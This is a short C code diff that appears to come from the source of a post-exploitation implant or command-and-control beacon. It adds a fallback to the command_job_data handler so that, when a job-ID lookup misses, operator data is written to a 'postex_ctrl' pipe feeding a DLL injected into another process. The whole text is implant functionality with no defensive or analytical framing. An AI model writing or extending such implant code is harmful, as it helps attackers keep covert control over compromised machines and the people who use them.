@@ -575,5 +575,20 @@ void command_job_data(char * buffer, int length) {
 		temp = (psh_entry*)temp->next;
 	}
 
+	/* kit DLL fallback: if the jid lookup misses, write to the postex_ctrl
+	 * pipe handle (tracked by command_job_spawn_user after kit DLL injection).
+	 * The kit DLL's bg loop reads follow-ups from this pipe. */
+	temp = psh_list;
+	while (temp != NULL) {
+		if (temp->status != JOB_STATUS_DEAD &&
+		    strstr(temp->description, "postex_ctrl") != NULL) {
+			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {
+				post_error_d(0x55, GetLastError());
+			}
+			return;
+		}
+		temp = (psh_entry*)temp->next;
+	}
+
 	post_error_d(0x56, (DWORD)jid);
 }
